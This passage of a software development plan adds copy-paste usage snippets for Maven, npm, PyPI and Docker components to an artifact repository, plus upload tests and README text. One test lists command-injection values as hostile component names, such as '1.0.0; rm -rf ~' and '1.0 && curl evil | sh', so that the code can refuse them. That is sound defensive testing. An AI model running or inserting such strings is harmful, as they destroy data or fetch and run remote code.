  - `Format.usage(address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]`, overridden by Maven, npm, PyPI and Docker. `address` is what `RepositoryView.url` gives.
  - `usage` in the answer of `GET /api/v1/content/{repository}/components/{id}`.

- [ ] **Step 1: Write the failing tests**

`backend/tests/repositories/test_usage.py`:

```python
"""How a component is used: what each format writes for a person to copy."""

import xml.etree.ElementTree as ElementTree

import pytest

from megooarti.repositories import formats, service
from megooarti.repositories.formats import ComponentKey, Usage, get_format
from megooarti.system.settings_store import set_setting
from tests.accounts import PASSWORD, basic
from tests.repositories.npm.conftest import package_tarball

HERE = "https://repo.example.com/repository"
VERSION = "com/acme/app/1.0"


@pytest.fixture
async def root(make_user) -> dict[str, str]:
    await make_user("root", roles=["admin"])
    return basic("root", PASSWORD)


def usage(format: str, address: str, key: ComponentKey, *files: str) -> list[Usage]:
    return get_format(format).usage(address, key, files)


def test_a_maven_artifact_is_a_dependency_of_a_build():
    found = usage(
        "maven",
        f"{HERE}/releases/",
        ComponentKey("com.acme", "app", "1.0"),
        f"{VERSION}/app-1.0.jar",
        f"{VERSION}/app-1.0.pom",
        f"{VERSION}/app-1.0-sources.jar",
    )

    assert [(entry.label, entry.language) for entry in found] == [
        ("Maven", "xml"),
        ("Gradle (Kotlin)", "kotlin"),
        ("Gradle (Groovy)", "groovy"),
    ]
    dependency = ElementTree.fromstring(found[0].text)
    assert {child.tag: child.text for child in dependency} == {
        "groupId": "com.acme",
        "artifactId": "app",
        "version": "1.0",
    }
    assert found[1].text == 'implementation("com.acme:app:1.0")'
    assert found[2].text == "implementation 'com.acme:app:1.0'"


@pytest.mark.parametrize(
    ("files", "kind"),
    [
        (["app-1.0.war", "app-1.0.pom"], "war"),
        (["app-1.0.pom"], "pom"),
        (["app-1.0.aar", "app-1.0.module", "app-1.0.pom", "app-1.0.aar.asc"], "aar"),
        (["app-1.0.zip", "app-1.0.jar"], None),
        (["app-1.0-sources.jar"], None),
        ([], None),
    ],
    ids=["war", "pom", "aar", "jar-too", "classifier-only", "nothing"],
)
def test_what_is_not_a_jar_is_asked_for_by_its_kind(files, kind):
    key = ComponentKey("com.acme", "app", "1.0")

    found = usage("maven", f"{HERE}/releases/", key, *(f"{VERSION}/{name}" for name in files))

    dependency = ElementTree.fromstring(found[0].text)
    assert dependency.findtext("type") == kind
    suffix = f"@{kind}" if kind else ""
    assert found[1].text == f'implementation("com.acme:app:1.0{suffix}")'
    assert found[2].text == f"implementation 'com.acme:app:1.0{suffix}'"


def test_an_npm_package_is_installed_from_its_registry():
    plain = usage("npm", f"{HERE}/npm/", ComponentKey("", "tool", "1.0.0"), "tool/-/tool-1.0.0.tgz")
    scoped = usage("npm", f"{HERE}/npm/", ComponentKey("acme", "tool", "2.0.0-beta.1"))

    assert [(entry.label, entry.language) for entry in plain] == [("npm", "shell")]
    assert plain[0].text == f"npm install tool@1.0.0 --registry={HERE}/npm/"
    assert scoped[0].text == f"npm install @acme/tool@2.0.0-beta.1 --registry={HERE}/npm/"


def test_a_python_package_is_installed_from_its_index():
    found = usage("pypi", f"{HERE}/pypi/", ComponentKey("", "my-package", "2.0.post1"))

    assert [(entry.label, entry.language) for entry in found] == [("pip", "shell")]
    assert found[0].text == f"pip install --index-url {HERE}/pypi/simple/ my-package==2.0.post1"


def test_an_image_is_pulled_by_its_tag():
    found = usage("docker", "repo.example.com/images", ComponentKey("", "team/app", "1.0"))
    kept = usage(
        "docker", "repo.example.com/images", ComponentKey("manifests", "team/app", "sha256:ab")
    )

    assert [(entry.label, entry.language) for entry in found] == [("Docker", "shell")]
    assert found[0].text == "docker pull repo.example.com/images/team/app:1.0"
    assert kept == []


def test_a_file_has_its_address_and_nothing_to_copy():
    assert usage("raw", f"{HERE}/files/", ComponentKey("docs", "guide.md"), "docs/guide.md") == []


@pytest.mark.parametrize(
    ("format", "key"),
    [
        ("maven", ComponentKey("com.acme", 'app") ; evil("', "1.0")),
        ("maven", ComponentKey("com.acme", "app", "1.0'\nevil()")),
        ("maven", ComponentKey("com acme", "app", "1.0")),
        ("npm", ComponentKey("", "tool", "1.0.0; rm -rf ~")),
        ("npm", ComponentKey("ac$(me)", "tool", "1.0.0")),
        ("pypi", ComponentKey("", "greeter", "1.0 && curl evil | sh")),
        ("pypi", ComponentKey("", "greeter", "1!2.0")),
        ("docker", ComponentKey("", "team/app", "1.0`id`")),
    ],
    ids=["quote", "newline", "space", "semicolon", "substitution", "and", "history", "backtick"],
)
def test_nothing_is_offered_to_paste_that_would_be_more_than_a_name(format, key):
    """What a remote or a deploy named is put where a person will run it."""
    assert usage(format, "https://repo.example.com/repository/x/", key) == []


def test_plain_text_is_what_is_safe_between_other_words():
    assert formats.plain("com.acme", "app_1", "1.0+build-7", "team/app", "~x", "")
    for hostile in (" ", "a b", "a;b", "$x", "`x`", "a'b", 'a"b', "a\nb", "a&b", "<a>", "é", "a!b"):
        assert not formats.plain("fine", hostile)


async def test_a_components_detail_says_how_to_use_it(client, root, db):
    await service.create_repository(
        db,
        name="releases",
        format="maven",
        type="hosted",
        online=True,
        blob_store="default",
        format_config={},
    )
    await set_setting(db, "base_url", "https://repo.example.com/")
    await db.commit()
    stored = await client.post(
        "/api/v1/content/releases/upload",
        data={"group": "com.acme", "artifact": "app", "version": "1.0", "packaging": "war"},
        files=[("file", ("app.war", b"PK war"))],
        headers=root,
    )
    component = stored.json()["components"][0]["id"]

    detail = await client.get(f"/api/v1/content/releases/components/{component}", headers=root)

    assert detail.status_code == 200, detail.text
    found = detail.json()["usage"]
    assert [entry["label"] for entry in found] == ["Maven", "Gradle (Kotlin)", "Gradle (Groovy)"]
    assert set(found[0]) == {"label", "language", "text"}
    assert "<type>war</type>" in found[0]["text"]


async def test_a_package_is_installed_from_the_address_people_are_given(client, root, db):
    await service.create_repository(
        db,
        name="npm",
        format="npm",
        type="hosted",
        online=True,
        blob_store="default",
        format_config={},
    )
    await set_setting(db, "base_url", "https://repo.example.com/")
    await db.commit()
    stored = await client.post(
        "/api/v1/content/npm/upload",
        files=[("file", ("tool.tgz", package_tarball("@acme/tool", "1.0.0")))],
        headers=root,
    )
    component = stored.json()["components"][0]["id"]

    detail = await client.get(f"/api/v1/content/npm/components/{component}", headers=root)

    assert [entry["text"] for entry in detail.json()["usage"]] == [
        "npm install @acme/tool@1.0.0 --registry=https://repo.example.com/repository/npm/"
    ]


async def test_a_file_of_a_raw_repository_has_no_usage(client, files, root):
    await client.put("/repository/files/docs/guide.md", content=b"# Guide", headers=root)
    listed = await client.get("/api/v1/content/files/components", headers=root)

    detail = await client.get(
        f"/api/v1/content/files/components/{listed.json()['items'][0]['id']}", headers=root
    )

    assert detail.json()["usage"] == []
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/test_usage.py tests/repositories/test_content_api.py -q`
Expected: collection error, `cannot import name 'Usage' from 'megooarti.repositories.formats'`.

- [ ] **Step 3: Implement**

In `backend/src/megooarti/repositories/formats.py`:

Replace

```python
from collections.abc import Awaitable, Callable, Collection
```

with

```python
import re
from collections.abc import Awaitable, Callable, Collection, Sequence
```

Before

```python
def _declared_size(request: Request) -> int | None:
```

add

```python
@dataclass(frozen=True)
class Usage:
    """One way to use a component, as text for a person to copy."""

    label: str  # who it is for: "Maven", "Gradle (Kotlin)", "npm"
    language: str  # what it is written in, for whoever shows it: xml, kotlin, groovy, shell
    text: str


_PLAIN = re.compile(r"[A-Za-z0-9_.+~/-]*")


def plain(*parts: str) -> bool:
    """Whether text can stand between other words in a command or a build file.

    A name comes from whoever deployed it, or from a remote. Put into something a
    person pastes and runs, a quote or a `;` in it would be theirs to run as well.
    """
    return all(_PLAIN.fullmatch(part) is not None for part in parts)
```

Before

```python
    def download_path(self, repository: str, path: str) -> str | None:
```

add

```python
    def usage(self, address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]:
        """How a component is used from a repository, as text to copy. The generic format: none.

        `address` is what a client is given for the repository: where it is, ending in
        a slash, or for a registry its host and its name. `files` are the paths of the
        component's files. Nothing is offered for a component whose name is not `plain`.
        """
        return []
```

In `backend/src/megooarti/repositories/maven/format.py`:

Replace

```python
from collections.abc import Callable, Iterable
```

with

```python
from collections.abc import Callable, Iterable, Sequence
```

Replace

```python
from typing import Any

import structlog
```

with

```python
from typing import Any
from xml.sax.saxutils import escape

import structlog
```

Replace

```python
    Format,
    Serve,
    invalid_upload,
    register,
)
from megooarti.repositories.forms import UploadForm
from megooarti.repositories.maven import checksums, metadata, paths, upload
```

with

```python
    Format,
    Serve,
    Usage,
    invalid_upload,
    plain,
    register,
)
from megooarti.repositories.forms import UploadForm
from megooarti.repositories.maven import checksums, metadata, paths, upload
```

Before

```python
class MavenFormat(Format):
    name = "maven"
```

add

```python
def _kind(files: Sequence[str]) -> str:
    """What a build has to name to be given the artifact: nothing, for a jar."""
    kinds = {
        file.extension
        for file in map(paths.classify, files)
        if file.kind == "artifact" and not file.classifier
    }
    kinds = {kind for kind in kinds if not kind.endswith(".asc")}  # a signature is of a file
    if "jar" in kinds or not kinds:
        return ""
    # A POM and Gradle's module file describe the artifact. They are it only if alone.
    others = sorted(kinds - {"pom", "module"})
    return others[0] if others else "pom"
```

Before

```python
    def content_type(self, path: str, declared: str | None) -> str | None:
        # Maven clients rarely declare a type, and never a useful one.
        return paths.content_type(path) or declared
```

add

```python
    def usage(self, address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]:
        """A dependency, as Maven and Gradle write one. The repository is named elsewhere."""
        kind = _kind(files)
        if not plain(key.namespace, key.name, key.version, kind):
            return []
        lines = [
            f"  <groupId>{escape(key.namespace)}</groupId>",
            f"  <artifactId>{escape(key.name)}</artifactId>",
            f"  <version>{escape(key.version)}</version>",
            *([f"  <type>{escape(kind)}</type>"] if kind else []),
        ]
        dependency = "\n".join(["<dependency>", *lines, "</dependency>"])
        notation = f"{key.namespace}:{key.name}:{key.version}" + (f"@{kind}" if kind else "")
        return [
            Usage("Maven", "xml", dependency),
            Usage("Gradle (Kotlin)", "kotlin", f'implementation("{notation}")'),
            Usage("Gradle (Groovy)", "groovy", f"implementation '{notation}'"),
        ]
```

In `backend/src/megooarti/repositories/npm/format.py`:

Replace

```python
    Format,
    Serve,
    invalid_upload,
    managed_by_format,
    only_fields,
    register,
)
```

with

```python
    Format,
    Serve,
    Usage,
    invalid_upload,
    managed_by_format,
    only_fields,
    plain,
    register,
)
```

Before

```python
    def describe_component(self, path: str) -> ComponentKey | None:
        """A tarball belongs to its package and version. Nothing else is part of one."""
```

add

```python
    def usage(self, address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]:
        if not plain(key.namespace, key.name, key.version):
            return []
        package = f"@{key.namespace}/{key.name}" if key.namespace else key.name
        command = f"npm install {package}@{key.version} --registry={address}"
        return [Usage("npm", "shell", command)]
```

In `backend/src/megooarti/repositories/pypi/format.py`:

Replace

```python
    Format,
    Serve,
    invalid_upload,
    only_fields,
    register,
)
```

with

```python
    Format,
    Serve,
    Usage,
    invalid_upload,
    only_fields,
    plain,
    register,
)
```

Before

```python
    def describe_component(self, path: str) -> ComponentKey | None:
        """A file belongs to its project and version. Nothing else is part of one."""
```

add

```python
    def usage(self, address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]:
        if not plain(key.name, key.version):
            return []
        command = f"pip install --index-url {address}simple/ {key.name}=={key.version}"
        return [Usage("pip", "shell", command)]
```

In `backend/src/megooarti/repositories/docker/format.py`:

Replace

```python
import json
import re
from datetime import datetime, timedelta
```

with

```python
import json
import re
from collections.abc import Sequence
from datetime import datetime, timedelta
```

Replace

```python
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    managed_by_format,
    register,
)
from megooarti.storage.backends import StagedBlob
```

with

```python
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    Usage,
    managed_by_format,
    plain,
    register,
)
from megooarti.storage.backends import StagedBlob
```

After

```python
    no_upload = "An image is pushed with a container client, not uploaded."
```

add

```python
    def usage(self, address: str, key: ComponentKey, files: Sequence[str]) -> list[Usage]:
        """Only a tag is pulled by a name of its own."""
        if key.namespace or not plain(key.name, key.version):
            return []
        return [Usage("Docker", "shell", f"docker pull {address}/{key.name}:{key.version}")]
```

In `backend/src/megooarti/repositories/content_api.py`:

Replace

```python
class ComponentDetail(ComponentView):
    files: list[Entry]
```

with

```python
class UsageView(BaseModel):
    label: str
    language: str  # what `text` is written in: xml, kotlin, groovy or shell
    text: str


class ComponentDetail(ComponentView):
    files: list[Entry]
    usage: list[UsageView]  # how it is used from this repository, as text to copy
```

Replace

```python
    handler = get_format(repository.format)
    if handler is not None and handler.served_at == "registry":
        # A container client is given a host and a name, not an address.
        url = f"{urlsplit(base).netloc}/{repository.name}"
    else:
        url = f"{base}/repository/{repository.name}/"
    members = None
```

with

```python
    members = None
```

Replace

```python
        type=repository.type,
        online=repository.online,
        url=url,
        members=members,
    )
```

with

```python
        type=repository.type,
        online=repository.online,
        url=_address(repository, get_format(repository.format), base),
        members=members,
    )
```

Before

```python
async def _view(
    db: AsyncSession, repository: Repository, base: str, caller: Principal
) -> RepositoryView:
```

add

```python
def _address(repository: Repository, handler: Format | None, base: str) -> str:
    """What a client is given for a repository."""
    if handler is not None and handler.served_at == "registry":
        # A container client is given a host and a name, not an address.
        return f"{urlsplit(base).netloc}/{repository.name}"
    return f"{base}/repository/{repository.name}/"
```

Replace

```python
async def get_component(
    repository: str,
    component_id: uuid.UUID,
    caller: Principal = Depends(require_caller),
    db: AsyncSession = Depends(get_session),
) -> ComponentDetail:
    found = await _holding(db, repository, caller)
    held = await browse.component(
        db, found, component_id, unlisted=_handler(found).unlisted_namespaces
    )
    if held is None:
        raise ApiError(404, "not_found", "No such component.")
    summary, files = held
    return ComponentDetail.model_validate(
        {**vars(summary), "files": [_entry(child) for child in files]}, from_attributes=True
    )
```

with

```python
async def get_component(
    repository: str,
    component_id: uuid.UUID,
    request: Request,
    caller: Principal = Depends(require_caller),
    db: AsyncSession = Depends(get_session),
) -> ComponentDetail:
    found = await _holding(db, repository, caller)
    handler = _handler(found)
    held = await browse.component(db, found, component_id, unlisted=handler.unlisted_namespaces)
    if held is None:
        raise ApiError(404, "not_found", "No such component.")
    summary, files = held
    usage = handler.usage(
        _address(found, handler, await _base(request, db)),
        ComponentKey(summary.namespace, summary.name, summary.version),
        [child.path for child in files],
    )
    return ComponentDetail.model_validate(
        {**vars(summary), "files": [_entry(child) for child in files], "usage": usage},
        from_attributes=True,
    )
```

Replace

```python
from megooarti.repositories.formats import Format, get_format
```

with

```python
from megooarti.repositories.formats import ComponentKey, Format, get_format
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/test_usage.py tests/repositories/test_content_api.py -q`
Expected: 50 passed.

- [ ] **Step 5: Run the whole suite and the linters**

Run: `uv run pytest -q && uv run ruff check . && uv run ruff format --check .`
Expected: 2717 passed, 1 skipped; no findings.

- [ ] **Step 6: Commit**

```bash
git add backend/src/megooarti backend/tests/repositories/test_usage.py
git commit -m "feat(content): how to use a component, in its detail"
```

---

### Task 7: The formats' own clients install what was uploaded

**Files:**
- Modify: `backend/tests/containers.py`
- Modify: `backend/tests/test_maven_client.py`
- Modify: `backend/tests/test_npm_client.py`
- Modify: `backend/tests/test_pypi_client.py`

**Interfaces:**
- Consumes: the upload route and the three hooks (Tasks 2 to 5), `usage` (Task 6), and each module's own helpers and fixtures.
- Produces: `containers.upload(repository, fields, files, headers) -> (status, body)`, and one test in each client module.

These tests add no code. They pass at once if Tasks 2 to 6 are right, and they are the proof that a jar with a written POM satisfies Maven, that a tarball from `npm pack` installs, and that pip installs what was uploaded. They need a Docker daemon and internet access.

- [ ] **Step 1: Write the tests**

Add to the end of `backend/tests/containers.py`:

```python
def upload(
    repository: str,
    fields: dict[str, str],
    files: list[tuple[str, str, bytes]],
    headers: dict | None = None,
):
    """An upload form sent to the content API of the published backend: (status, body).

    `files` are (the name of the part, the file's name, its content).
    """
    boundary = "megooarti-test-upload-4dZ1u8RkQ2"
    body = b""
    for name, value in fields.items():
        head = f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
        body += f"{head}{value}\r\n".encode()
    for part, filename, content in files:
        disposition = f'form-data; name="{part}"; filename="{filename}"'
        head = (
            f"--{boundary}\r\nContent-Disposition: {disposition}\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"
        )
        body += head.encode() + content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    request = urllib.request.Request(
        f"http://127.0.0.1:{HTTP_PORT}/api/v1/content/{repository}/upload",
        method="POST",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}", **(headers or {})},
    )
    try:
        with urllib.request.urlopen(request, timeout=120) as response:
            return response.status, json.loads(response.read())
    except urllib.error.HTTPError as error:
        return error.code, json.loads(error.read() or b"null")
```

In `backend/tests/test_maven_client.py`:

Replace

```python
from tests.containers import HTTP_PORT, PROJECT, call
```

with

```python
from tests.containers import HTTP_PORT, PROJECT, call, upload
```

Add to the end of `backend/tests/test_maven_client.py`:

```python
def test_a_jar_uploaded_through_the_api_is_resolved_by_a_build(repositories, tmp_path):
    """A jar a build made is uploaded with no POM, and another build depends on it."""
    project = library(tmp_path / "built", "3.0")
    built = maven(
        project, f"{MAVEN} --quiet package > /dev/null && base64 -w0 target/library-3.0.jar"
    )
    assert built.returncode == 0, built.stdout[-4000:] + built.stderr[-2000:]
    jar = base64.b64decode(built.stdout.strip())
    assert jar.startswith(b"PK")
    basic = base64.b64encode(f"{USERNAME}:{PASSWORD}".encode()).decode()
    account = {"Authorization": f"Basic {basic}"}
    coordinates = {"group": "io.megooarti.test", "artifact": "library", "version": "3.0"}

    status, stored = upload("releases", coordinates, [("file", "library.jar", jar)], account)
    assert status == 201, stored
    assert [file["path"] for file in stored["files"]] == [
        f"{LIBRARY}/3.0/library-3.0.jar",
        f"{LIBRARY}/3.0/library-3.0.pom",
    ]
    # This account may add and may not edit, so it cannot upload the version again.
    status, again = upload("releases", coordinates, [("file", "library.jar", jar)], account)
    assert (status, again["error"]["code"]) == (403, "forbidden")
    status, proxied = upload("central", coordinates, [("file", "library.jar", jar)], account)
    assert (status, proxied["error"]["code"]) == (409, "upload_not_supported")

    assert fetch(f"releases/{LIBRARY}/3.0/library-3.0.jar") == jar
    sha1 = fetch(f"releases/{LIBRARY}/3.0/library-3.0.jar.sha1")
    assert sha1.decode() == hashlib.sha1(jar).hexdigest()
    listed = metadata.parse(fetch(f"releases/{LIBRARY}/maven-metadata.xml"))
    assert "3.0" in listed.versions

    # A local repository that has never seen the library: Maven reads the POM that was
    # written for it, and compiles against the jar.
    projects = consumers(tmp_path / "consumers", {"uploaded": "3.0"})
    resolved = maven(
        projects, f"{MAVEN} -Dmaven.repo.local=/tmp/empty-repository -f uploaded/pom.xml compile"
    )
    assert resolved.returncode == 0, resolved.stdout[-4000:]
    for kind in ("pom", "jar"):
        downloaded = (
            f"Downloaded from megooarti: {INSIDE}/releases/{LIBRARY}/3.0/library-3.0.{kind}"
        )
        assert downloaded in resolved.stdout, resolved.stdout[-4000:]
    assert "The POM for io.megooarti.test:library:jar:3.0 is" not in resolved.stdout
```

In `backend/tests/test_npm_client.py`:

Before

```python
import json
import subprocess
```

add

```python
import base64
```

Replace

```python
from tests.containers import HTTP_PORT, PROJECT, call
```

with

```python
from tests.containers import HTTP_PORT, PROJECT, call, upload
```

Add to the end of `backend/tests/test_npm_client.py`:

```python
def test_a_tarball_uploaded_through_the_api_installs_like_a_published_one(token, tmp_path):
    """`npm pack` writes the tarball, the content API takes it, and npm installs it."""
    name = "megooarti-uploaded"
    fresh = sign_in()  # the first test signs out of the token it was given
    signed_in = {"Authorization": f"Bearer {fresh}"}
    packing = write(
        tmp_path / "pack", {"package": package(name, "1.0.0", description="Uploaded")}, fresh
    )
    packed = npm(packing, "cd package && npm pack --silent > /dev/null && base64 -w0 *.tgz")
    assert packed.returncode == 0, said(packed)
    tarball = base64.b64decode(packed.stdout.strip())

    status, stored = upload(HOSTED, {}, [("file", f"{name}-1.0.0.tgz", tarball)], signed_in)
    assert status == 201, stored
    assert [file["path"] for file in stored["files"]] == [f"{name}/-/{name}-1.0.0.tgz"]
    status, again = upload(HOSTED, {}, [("file", f"{name}-1.0.0.tgz", tarball)], signed_in)
    assert (status, again["error"]["code"]) == (409, "redeploy_disabled")

    # The detail of what was stored says how to install it.
    component = stored["components"][0]["id"]
    status, _, detail = call("GET", f"/content/{HOSTED}/components/{component}", None, signed_in)
    assert status == 200, detail
    assert [entry["text"] for entry in detail["usage"]] == [
        f"npm install {name}@1.0.0 --registry=http://127.0.0.1:{HTTP_PORT}/repository/{HOSTED}/"
    ]

    consumer = {
        "package.json": json.dumps(
            {
                "name": "consumer",
                "version": "1.0.0",
                "private": True,
                "dependencies": {name: "1.0.0"},
            }
        ),
        "main.js": f'console.log(require("{name}")());\n',
    }
    work = write(tmp_path / "install", {"consumer": consumer}, fresh)
    installed = npm(
        work,
        f"npm view {name} description dist-tags.latest && cd consumer && npm install"
        " && node main.js",
    )
    assert installed.returncode == 0, said(installed)
    assert "Uploaded" in installed.stdout
    assert f"hello from {name}@1.0.0" in installed.stdout
```

In `backend/tests/test_pypi_client.py`:

Replace

```python
from base64 import b64encode
```

with

```python
from base64 import b64decode, b64encode
```

Replace

```python
from tests.containers import HTTP_PORT, PROJECT, call
```

with

```python
from tests.containers import HTTP_PORT, PROJECT, call, upload
```

Add to the end of `backend/tests/test_pypi_client.py`:

```python
def test_files_uploaded_through_the_api_are_installed_by_pip(token, tmp_path):
    """A wheel and a source distribution go in through the content API, and pip installs."""
    name = "megooarti-uploaded"
    work = tmp_path / "uploaded"
    work.mkdir()
    (work / "make_dist.py").write_text(MAKE_DIST, encoding="utf-8", newline="\n")
    made = python(
        work,
        f"python make_dist.py {name} 1.0.0 > /dev/null"
        ' && for file in dist/*; do echo "$(basename $file) $(base64 -w0 $file)"; done',
    )
    assert made.returncode == 0, said(made)
    files = {
        filename: b64decode(encoded)
        for filename, _, encoded in (line.partition(" ") for line in made.stdout.splitlines())
    }
    wheel, sdist = "megooarti_uploaded-1.0.0-py3-none-any.whl", "megooarti_uploaded-1.0.0.tar.gz"
    assert sorted(files) == [wheel, sdist]
    signed_in = {"Authorization": f"Bearer {token}"}
    parts = [("file", filename, content) for filename, content in files.items()]

    status, stored = upload(HOSTED, {"requires_python": ">=3.9"}, parts, signed_in)
    assert status == 201, stored
    assert sorted(file["path"] for file in stored["files"]) == [
        f"packages/{name}/1.0.0/{wheel}",
        f"packages/{name}/1.0.0/{sdist}",
    ]
    assert [found["name"] for found in stored["components"]] == [name]
    status, again = upload(HOSTED, {}, parts[:1], signed_in)
    assert (status, again["error"]["code"]) == (409, "redeploy_disabled")

    status, page = fetch(f"simple/{name}/", "__token__", token)
    assert status == 200
    assert page.count('data-requires-python="&gt;=3.9"') == 2
    component = stored["components"][0]["id"]
    status, _, detail = call("GET", f"/content/{HOSTED}/components/{component}", None, signed_in)
    assert status == 200, detail
    address = f"http://127.0.0.1:{HTTP_PORT}/repository/{HOSTED}/"
    assert [entry["text"] for entry in detail["usage"]] == [
        f"pip install --index-url {address}simple/ {name}==1.0.0"
    ]

    # pip installs it from an empty cache, by the index's own pages.
    index = f"http://{USERNAME}:{PASSWORD}@backend:8000/repository/{HOSTED}/simple/"
    pip = f"pip install --quiet --index-url {index} --trusted-host backend"
    run_it = 'python -c "import megooarti_uploaded; print(megooarti_uploaded.hello())"'
    installed = python(work, f"{pip} {name}==1.0.0 && {run_it}")
    assert installed.returncode == 0, said(installed)
    assert installed.stdout.splitlines()[-1] == f"hello from {name} 1.0.0"
```

- [ ] **Step 2: Run them**

Run: `uv run pytest -m docker tests/test_npm_client.py tests/test_pypi_client.py tests/test_maven_client.py -k uploaded -q`
Expected: 3 passed, 8 deselected. It takes a few minutes: the image is built once for each module.

- [ ] **Step 3: Commit**

```bash
git add backend/tests/containers.py backend/tests/test_maven_client.py backend/tests/test_npm_client.py backend/tests/test_pypi_client.py
git commit -m "test: uploads through the API, installed by the formats' own clients"
```

---

### Task 8: Documentation

**Files:**
- Modify: `README.md`
- Modify: `docs/superpowers/specs/2026-10-11-browse-search-upload-design.md`

**Interfaces:**
- Consumes: uploading and usage as built.
- Produces: a section of the README, and a spec that says what was built.

- [ ] **Step 1: Document uploading and usage**

In `README.md`:

After

```markdown
- **A component** is a package version: a Maven artifact version, an npm package
  version, a PyPI release, a Docker tag. In a Raw repository every file is one.
  `components/<id>` lists its files.
```

add

```markdown
- **How to use a component** is part of its detail: `usage` is a list of snippets,
  each with a `label`, the `language` it is written in (`xml`, `kotlin`, `groovy` or
  `shell`) and the `text` to copy. Maven gets a `<dependency>` and a line for Gradle
  in Kotlin and in Groovy, npm `npm install <name>@<version> --registry=<address>`,
  PyPI `pip install --index-url <address>simple/ <name>==<version>`, a Docker tag
  `docker pull <host>/<repository>/<image>:<tag>`. The address is the repository's
  public one (the `base_url` setting, if it is set). A Raw file has no snippet: it has
  its `download` address. Nor has a component whose name or version holds anything
  but letters, digits and `. _ + ~ / -`: the text is there to be pasted into a shell
  or a build file, and a name is chosen by whoever deployed it.
```

Replace

```markdown
- **An offline repository** can still be browsed and deleted from here. Being offline
  stops package clients, not the people who tend the repository.
```

with

```markdown
- **An offline repository** can still be browsed, deleted from and uploaded to here.
  Being offline stops package clients, not the people who tend the repository.
```

Before

```markdown
## Search

`/api/v1/search` finds components in every repository you may browse.
```

add

````markdown
## Uploading

A file can be put into a hosted repository without a package client: one
`multipart/form-data` request to `/api/v1/content/<repository>/upload`, with the
fields its format needs.

```bash
# Raw: files into a directory, each under its own name
curl -u alice -F directory=docs/v1 -F file=@guide.pdf -F file=@logo.png \
  https://repo.example.com/api/v1/content/files/upload

# Maven: an artifact by its coordinates. A POM is written for it
curl -u alice -F group=com.acme -F artifact=app -F version=1.0 \
  -F file=@app.jar -F file.sources=@app-sources.jar \
  https://repo.example.com/api/v1/content/maven-releases/upload

# npm: the tarball that `npm pack` writes
curl -u alice -F file=@tool-1.0.0.tgz https://repo.example.com/api/v1/content/npm-hosted/upload

# PyPI: wheels and source distributions
curl -u alice -F file=@greeter-1.0-py3-none-any.whl -F file=@greeter-1.0.tar.gz \
  https://repo.example.com/api/v1/content/pypi-hosted/upload
```

| Format | Fields | Files |
| --- | --- | --- |
| Raw | `directory` (the root without it) | One or more `file`, each stored in the directory under its own name |
| Maven | `group`, `artifact`, `version`; `packaging` (default `jar`); `generate_pom` (default `true`) | `file` for the artifact, `file.<classifier>` for a file beside it (`file.sources`), `pom` for its POM |
| npm | `tag` (default `latest`) | One `file`: a package tarball. Its `package.json` says the name and the version |
| PyPI | `summary`, `requires_python`, `keywords`, each optional and said of every file | One or more `file`: wheels and source distributions (`.whl`, `.tar.gz`, `.zip`) |

- **The answer** is `201` with the `files` that were stored, each described as `asset`
  describes a file, and the `components` they belong to.
- **All or nothing.** If one file of a form is refused, none of them is stored.
- **Permissions and policy are those of any upload:** `add` for a new file, `edit` to
  replace one, and the repository's deployment policy. Uploading needs no right to
  browse or to read.
- **A file must be sent as a file**, with a file name: `-F file=@app.jar`, not
  `-F file=app.jar`. A field the format does not know is refused, so a misspelt one
  is not silently ignored.
- **Maven.** The files go where a deploy would put them, and checksums and
  `maven-metadata.xml` follow by themselves. What a file is (`jar`, `war`, `tar.gz`,
  `jar.asc`) is read from the end of its own name; the rest of its name does not
  matter. Without a POM, one is written that says the group, artifact, version and
  packaging: enough for a build that depends on the artifact. None is written if the
  form sends one, if the version already has one, or with `generate_pom=false`. The
  repository's version policy applies. In a snapshot repository an uploaded file is
  stored under its plain name (`app-1.0-SNAPSHOT.jar`), and a timestamped build that
  a build tool deploys ranks above it.
- **npm.** What is stored is what `npm publish` would store: the tarball, and the
  `package.json` inside it as the version's manifest. A package whose `package.json`
  says `"private": true` is refused, as npm refuses to publish it. The tarball may be
  as large as a publish may be (`MEGOOARTI_NPM_MAX_PUBLISH_BYTES`), and is read into
  memory to find its `package.json`. Every other upload goes to the blob store as it
  arrives.
- **PyPI.** A file's name says its project and version. A source distribution's is
  read as the project, a hyphen and the version, so its version must be written
  without a hyphen (`1.0.post1`, not `1.0-1`), as current build tools write it.
- **Docker images are pushed** with a container client. A Docker repository, a proxy
  and a group answer `409 upload_not_supported`.
- **A form that cannot be used** answers `422 validation_error`, and its `details`
  name the field. A file that is not what its format takes answers as that format's
  own upload does (`400 invalid_package`, `400 version_policy_violation`,
  `400 invalid_path`).
````

- [ ] **Step 2: Bring the spec in line with what was built**

In `docs/superpowers/specs/2026-10-11-browse-search-upload-design.md`:

Replace

```markdown
- **Two hooks on a format:** `upload`, given the fields and files of a form, and `usage`, given a component and the repository's public address.
```

with

```markdown
- **Two hooks on a format:** `upload`, given the fields and files of a form, and `usage`, given a component, its files and the address a client is given for the repository.
- **Reading a form.** A `multipart/form-data` body is read as it arrives: fields into memory, each file to temporary storage, never into memory. What a format does not store is discarded by the route. A format that has to look inside a file can read a staged one, up to a limit it names.
```

Replace

```markdown
| Maven | `group`, `artifact`, `version`, `packaging` (default `jar`), `generate_pom` (default true), and one or more `file` parts, each with an optional `classifier` and `extension` taken from the part's name (`file`, `file.sources`, `file.pom`). A POM that is uploaded is used; checksums and metadata are written as for a deploy |
| npm | One `file`, a package tarball. Its `package.json` says what it is; it is published as `npm publish` would |
| PyPI | One or more `file` parts, wheels or source distributions. Their names say what they are; they are stored as an upload by twine would |

The answer is `201` with the components and files that were stored. The deployment policy and the `add` and `edit` permissions apply as to any upload. A Docker repository, a proxy and a group answer `409`.
```

with

```markdown
